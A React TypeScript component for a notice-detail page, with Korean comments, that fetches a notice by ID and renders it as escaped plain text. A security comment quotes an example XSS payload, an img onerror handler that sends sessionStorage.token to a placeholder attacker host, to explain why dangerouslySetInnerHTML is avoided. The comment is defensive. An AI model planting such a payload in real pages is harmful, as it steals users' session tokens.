import { useEffect, useState } from 'react';
import { Link, useParams } from 'react-router-dom';

import type { NoticeType } from '../../components/ts/Notice';
import { NOTICE_TNAME, NOTICE_TYPE_BADGE, NOTICE_TYPE_LABEL } from '../../components/ts/Notice';

import { AttachViewer, EmptyState, Loading } from '../../components/ui';
import { usePaging } from '../../hooks/usePaging';
import { axiosInstance, comma, toDate } from '../../utils/Tool';

/* ============================================================================
   공지사항 상세

   GET /notice/{no}  →  NoticeType (서버에서 조회수 +1 처리)
============================================================================ */

export default function NoticeDetail() {
  /** URL의 :no — useParams가 돌려주는 값은 항상 string | undefined 입니다 */
  const { no } = useParams<{ no: string }>();

  /** 목록 복귀용. 현재 쿼리스트링(page, word...)을 유지한 채 /notice로 돌아갑니다 */
  const { goList } = usePaging({ basePath: '/notice' });

  const [notice, setNotice] = useState<NoticeType | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');

  useEffect(() => {
    // 주소창에 /notice/abc 처럼 숫자가 아닌 값이 들어올 수 있으므로 먼저 확인합니다.
    const bno = Number(no);
    if (!no || Number.isNaN(bno)) {
      setError('잘못된 접근입니다.');
      setLoading(false);
      return;
    }

    let alive = true;

    const load = async () => {
      setLoading(true);
      setError('');
      try {
        const res = await axiosInstance.get<NoticeType>(`/notice/${bno}`);
        if (!alive) return;
        setNotice(res.data);
      } catch (err) {
        if (!alive) return;
        console.error('공지 조회 실패:', err);
        setError('삭제되었거나 존재하지 않는 공지입니다.');
        setNotice(null);
      } finally {
        if (alive) setLoading(false);
      }
    };

    load();
    return () => { alive = false; };
    // no가 바뀌면(다른 공지로 이동) 다시 조회합니다.
  }, [no]);

  /* ------------------------------------------------------------------------
     렌더링
  ------------------------------------------------------------------------ */

  if (loading) {
    return (
      <div className="container">
        <div className="section">
          <Loading message="공지사항을 불러오는 중입니다..." />
        </div>
      </div>
    );
  }

  if (error || !notice) {
    return (
      <div className="container">
        <div className="section">
          <EmptyState
            icon="📭"
            message={error || '공지사항을 찾을 수 없습니다.'}
            sub="목록에서 다시 선택해 주세요."
            action={<Link to="/notice" className="btn btn_primary">공지사항 목록</Link>}
          />
        </div>
      </div>
    );
  }

  return (
    <div className="container">
      <div className="section">
        <article className="notice_view">
          {/* ---------------- 머리말 ---------------- */}
          <header className="notice_view_head">
            <div className="flex center g4 wrap">
              <span className={`badge ${NOTICE_TYPE_BADGE[notice.type] ?? 'badge_muted'}`}>
                {notice.typeLabel ?? NOTICE_TYPE_LABEL[notice.type] ?? '일반'}
              </span>
              {notice.topYn === 'Y' && <span className="badge badge_solid">상단 고정</span>}
            </div>

            <h3>{notice.title}</h3>

            <div className="notice_view_meta">
              <span>등록일 {toDate(notice.cdate)}</span>
              {notice.udate && notice.udate !== notice.cdate && (
                <span>수정일 {toDate(notice.udate)}</span>
              )}
              <span>조회 {comma(notice.vcnt)}</span>
            </div>
          </header>

          {/* ---------------- 본문 ----------------
              [보안] dangerouslySetInnerHTML을 쓰지 않는 이유

              그 속성은 문자열을 그대로 HTML로 해석해 삽입합니다.
              관리자 계정이 탈취되거나 본문이 다른 경로로 오염되면
              <img src=x onerror="fetch('http://공격자/'+sessionStorage.token)">
              같은 코드가 실제로 실행되어 토큰이 새어 나갑니다(XSS).

              공지 본문은 서식이 필요 없는 평문이므로
              React의 기본 동작(문자열은 항상 텍스트로 이스케이프)을 그대로 쓰고,
              줄바꿈만 CSS white-space: pre-line 으로 살렸습니다.
              이러면 \n은 줄바꿈으로 보이고 태그는 글자 그대로 표시됩니다.
              (서식 있는 에디터가 꼭 필요하다면 DOMPurify 같은 라이브러리로
               새니타이즈한 뒤에 넣어야 합니다.)
          ------------------------------------------ */}
          <div className="notice_view_body">{notice.content}</div>

          {/* ---------------- 첨부파일 ----------------
              이미지/파일 목록은 AttachViewer가 /attach/list/NOTICE/{no}로 직접 조회합니다.
              첨부가 없으면 컴포넌트가 스스로 null을 반환하므로 조건문이 필요 없습니다. */}
          <div className="notice_view_attach">
            <AttachViewer tname={NOTICE_TNAME} bno={notice.no} />
          </div>
        </article>

        <div className="actions center">
          <button type="button" className="btn btn_dark btn_lg" onClick={() => goList('/notice')}>
            목록으로
          </button>
        </div>
      </div>
    </div>
  );
}
